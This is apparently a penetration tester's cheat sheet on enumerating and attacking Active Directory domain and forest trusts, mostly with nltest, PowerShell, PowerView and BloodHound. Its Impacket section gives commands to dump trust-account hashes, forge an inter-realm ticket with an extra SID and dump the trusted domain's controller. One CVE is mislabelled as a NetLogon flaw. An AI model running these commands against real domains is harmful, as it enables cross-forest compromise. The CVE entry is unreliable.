---
aliases:
  - Trust Tooling
  - nltest
  - Get-ADTrust
  - PowerView Trusts
  - BloodHound Trusts
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Domain & Forest Trusts]]"
  - "[[netexec]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - Domain & Forest Trusts - Tooling

***

## nltest (Native Windows)

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| All trusts | `nltest /domain_trusts /v` | Comprehensive. |
| Forest-wide | `nltest /domain_trusts /all_trusts` | Multi-domain. |
| Direct trusts only | `nltest /trusted_domains` | Local. |
| Per-server | `nltest /server:DC /trusted_domains` | Cross-target. |
| Secure channel query | `nltest /sc_query:<dom>` | Health. |
| Secure channel verify | `nltest /sc_verify:<dom>` | Bidirectional. |
| Secure channel reset | `nltest /sc_reset:<dom>` | Privileged. |
| DC list | `nltest /dclist:<dom>` | Adjacent. |
| Closest DC | `nltest /dsgetdc:<dom>` | Adjacent. |
| PDC discovery | `nltest /dsgetdc:<dom> /pdc` | Adjacent. |
| GC discovery | `nltest /dsgetdc:<dom> /gc` | Adjacent. |
| Site info | `nltest /dsgetsite` | Local site. |
| Transitive resolution | `nltest /transitive_server:DC` | Edge. |
| Path discovery | `nltest /dsgetfti` | Forest trust info. |
| Output flags | PRIMARY/NATIVE/TREE_ROOT/etc | Decode. |
| Per-trust verbose | `/v` flag | Detail. |
^ad-trusttool-nltest

### nltest cheatsheet

```cmd
:: All trusts comprehensive
nltest /domain_trusts /all_trusts /v

:: Output flags decoded:
:: 0x00000001  PRIMARY
:: 0x00000002  NATIVE  
:: 0x00000004  WITHIN_FOREST
:: 0x00000008  DIRECT_OUTBOUND
:: 0x00000010  TREE_ROOT
:: 0x00000020  DIRECT_INBOUND
:: 0x00000040  FOREST_TRANSITIVE
:: 0x00000080  CROSS_ORGANIZATION
:: 0x00000100  RUNNING

:: Health check all trusts
for /f "skip=2 tokens=2 delims=:" %d in ('nltest /domain_trusts ^| findstr /i "Trusted DNS"') do nltest /sc_verify:%d
```

___

## RSAT / PowerShell

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| All trusts | `Get-ADTrust -Filter *` | Standard. |
| All properties | `Get-ADTrust -Filter * -Properties *` | Detailed. |
| Filter direction | `Get-ADTrust -Filter {Direction -eq "BiDirectional"}` | Filter. |
| Filter type | `Get-ADTrust -Filter {TrustType -eq "Forest"}` | Filter. |
| Forest info | `Get-ADForest` | Forest object. |
| Per-domain | `Get-ADDomain -Identity <dom>` | Standard. |
| All domains in forest | `Get-ADForest \| Select Domains` | List. |
| Forest trusts | `(Get-ADForest).GetForestTrusts()` (.NET method) | Edge. |
| Trust DACL | `Get-Acl "AD:CN=trustname,CN=System,DC=..."` | ACL audit. |
| Set trust attribute | `Set-ADTrust` | Privileged. |
| Modify trust attribute | `Set-ADTrust -Identity <trust> -SelectiveAuthentication $true` | Hardening. |
| Remove trust | `Remove-ADTrust` | Privileged. |
| Create new trust | `New-ADTrust` | Privileged. |
| `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()` | .NET | Adjacent. |
| `.GetTrustRelationship(<dom>)` | .NET method | Adjacent. |
| `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` | .NET | Adjacent. |
^ad-trusttool-rsat

### RSAT comprehensive

```powershell
# Trust overview
Get-ADTrust -Filter * | Format-Table Name,Direction,TrustType,IsTransitive,Source,Target

# Trust + attributes
Get-ADTrust -Filter * -Properties trustAttributes |
  Select Name,Direction,@{n='Attrs';e={'0x{0:X}' -f $_.trustAttributes}}

# .NET method (legacy)
$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$forest.GetAllTrustRelationships()

# Per-domain trusts
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.GetAllTrustRelationships()
```

___

## PowerView / pywerview

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Direct trusts | `Get-DomainTrust` | Adversary tool. |
| Trust mapping (forest-wide) | `Get-DomainTrustMapping` | Walk all reachable. |
| Trust API method | `Get-DomainTrustMapping -API` | Win32 API. |
| Forest trusts | `Get-ForestTrust` | Forest scope. |
| Forest domains | `Get-ForestDomain` | List. |
| Forest GCs | `Get-ForestGlobalCatalog` | Adjacent. |
| Find foreign user | `Find-ForeignUser` | Cross-trust users. |
| Find foreign group | `Find-ForeignGroup` | Cross-trust groups. |
| Domain SID | `Get-DomainSID` | Cross-trust. |
| Convert AD name formats | `Convert-ADName` | Helper. |
| Trust search base | `Get-DomainTrust -SearchBase "GC://..."` | Cross-server. |
| Trust attributes object | `Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties *` | LDAP raw. |
| pywerview equivalent | `pywerview get-domaintrust` | Linux. |
| pywerview foreign | `pywerview find-foreignuser` | Linux. |
| pywerview mapping | `pywerview get-domaintrust-mapping` | Linux. |
| Limitations: heavy LDAP queries | SIEM-flagged | Operational. |
^ad-trusttool-powerview

### PowerView trust scripts

```powershell
# Local trusts
Get-DomainTrust

# Forest map (WALK — slow)
Get-DomainTrustMapping

# Forest scope only
Get-ForestTrust
Get-ForestDomain

# Find foreign principals in current domain
Find-ForeignUser
Find-ForeignGroup

# All trust objects via LDAP (raw)
Get-DomainObject -SearchBase "CN=System,DC=dom,DC=local" `
  -LDAPFilter "(objectClass=trustedDomain)" `
  -Properties *
```

```bash
# Linux pywerview
pywerview get-domaintrust -u user -p pass -d dom.local --dc-ip DC
pywerview find-foreignuser -u user -p pass -d dom.local
pywerview get-domaintrust-mapping -u user -p pass -d dom.local
```

___

## BloodHound / SharpHound

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Collect Trusts | `SharpHound -c Trusts` | Targeted. |
| Collect All (incl. trusts) | `SharpHound -c All` | Comprehensive. |
| RustHound | `rusthound -d dom -u u -p p --zip` | Modern alt. |
| BloodHound.py (Linux) | `bloodhound-python -d dom -u u -p p -ns DC -c Trusts` | Linux collector. |
| Cross-domain ingest | Multiple SharpHound runs per domain | Sequential. |
| Forest-wide automated (BHCE 6.x) | Improved | Modern. |
| Trust edges in graph | Visual | Standard. |
| Cross-trust path query | Cypher `MATCH p=shortestPath(...)` | Custom. |
| ForeignGroupMembership analytics | Built-in | Standard. |
| BloodHound Enterprise | Continuous trust monitoring | Commercial. |
| Custom Cypher analytics | Trust + ACL combo | Advanced. |
| Visual: Domain graph | Tier-based | Helpful. |
| Trust direction in edge | Property | Standard. |
| Trust transitivity in edge | Property | Standard. |
| Cross-forest ingestion | Multiple forests | Edge. |
| Refreshing data | Re-collect periodically | Operational. |
^ad-trusttool-bh

### BloodHound trust collection + queries

```bash
# Step 1: SharpHound collection (Trusts focus)
.\SharpHound.exe -c Trusts,DCOnly

# Or RustHound (Linux)
rusthound -d dom-A.local -u user -p pass --zip

# Step 2: Multi-domain (run per domain)
.\SharpHound.exe -c Trusts,DCOnly -d dom-A.local
.\SharpHound.exe -c Trusts,DCOnly -d dom-B.local

# Step 3: Ingest all into BloodHound

# Step 4: Cypher queries
```

```cypher
// All trusts visualized
MATCH p=(:Domain)-[r:Trusts]->(:Domain) RETURN p

// Cross-trust attack paths
MATCH (u {owned: true})
MATCH (target {highvalue: true})
WHERE u.domain <> target.domain
MATCH p=shortestPath((u)-[*1..]->(target))
RETURN p
```

___

## Impacket / Linux Trust Tools

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| `lookupsid.py` | `impacket-lookupsid 'dom/u:p'@DC` | Cross-trust SID enum. |
| `secretsdump -just-dc` | `secretsdump dom/admin:pass@DC -just-dc` | Trust account hashes. |
| `getST.py` cross-realm | `impacket-getST -spn ...` | TGS cross-realm. |
| `ticketer.py` forge inter-realm | `ticketer.py -nthash <trust> -domain ... -extra-sid ...` | Forge. |
| `getTGT.py` cross-trust | Cross-realm TGT request | Standard. |
| `ldap-monitor.py` | Trust modification monitoring | Defender adjacent. |
| `bloodhound-python` | Linux BH collector | Standard. |
| `windapsearch --trusts` | Trust enum wrapper | Linux helper. |
| `ldapdomaindump` | HTML report includes trusts | Linux helper. |
| `nxc ldap DC --trusts` | netexec wrapper | Quick. |
| `certipy` ADCS cross-trust | ADCS combo | Adjacent. |
| `bloodyAD trust query` | LDAP modify trusts | Privileged. |
| Custom Python scripts | DIY automation | Edge. |
| Kerberos toolkit (`ldapsearch -Y GSSAPI`) | Linux Kerberos auth | Standard. |
| MIT Kerberos cross-realm | Linux KDC compat | Edge. |
| `kinit -t keytab` cross-realm | Linux Kerberos | Edge. |
^ad-trusttool-impacket

### Impacket trust toolkit

```bash
# Cross-trust SID enumeration
impacket-lookupsid 'dom-A.local/user:pass'@DC-A.dom-A.local 5000

# Trust account dump (privileged)
impacket-secretsdump dom-A.local/admin:pass@DC-A -just-dc | grep '\$:'

# Forge inter-realm TGT (Linux)
impacket-ticketer -nthash <TRUST_HASH> \
  -domain-sid <DOM-A-SID> \
  -domain dom-A.local \
  -extra-sid <DOM-B-DA-SID> \
  -spn krbtgt/dom-B.local \
  Administrator

# Use forged TGT
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dom-B-DC.dom-B.local
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks Trust Attacks | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/cross-forest` | Reference. |
| The Hacker Recipes - Trusts | `thehacker.recipes/ad/movement/trusts` | Comprehensive. |
| ADSecurity Sean Metcalf - Trust attacks | `adsecurity.org` | Research. |
| Will Schroeder - "A Guide To Attacking Domain Trusts" | Specter Ops blog | Foundational. |
| Dirk-jan Mollema - Trust attacks | `dirkjanm.io` | Research. |
| Microsoft Trust Documentation | `learn.microsoft.com` | Vendor. |
| `awesome-active-directory` | GitHub | Foundation. |
| MITRE ATT&CK T1482 | Domain Trust Discovery | Framework. |
| MITRE ATT&CK T1484 | Domain Policy Modification | Adjacent. |
| KB4490425 (TGT Delegation) | Microsoft KB | Specific patch. |
| CVE-2019-1040 | NetLogon vuln | Critical. |
| CVE-2020-1472 (Zerologon) | Trust account compromise vector | Adjacent. |
| Defender for Identity trust alerts | Microsoft | Defender. |
| BloodHound trust analytics | Custom Cypher | Tool. |
| PingCastle trust audit | Defender | Adjacent. |
^ad-trusttool-wordlists

***
